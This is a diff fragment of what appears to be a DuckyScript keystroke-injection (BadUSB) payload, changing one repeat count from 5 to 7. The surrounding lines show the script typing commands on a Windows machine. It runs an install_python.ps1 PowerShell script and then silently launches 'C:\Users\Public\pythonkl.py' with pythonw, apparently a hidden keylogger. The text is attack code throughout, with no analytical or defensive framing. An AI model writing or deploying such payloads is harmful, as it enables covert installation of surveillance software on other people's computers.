@@ -22,7 +22,7 @@ DELAY 10000
 REPEAT 5
 STRING ./install_python.ps1 "parameter title"
 DELAY 10000
-REPEAT 5
+REPEAT 7
 STRING pythonw 'C:\Users\Public\pythonkl.py'
 ENTER
 DELAY 10000
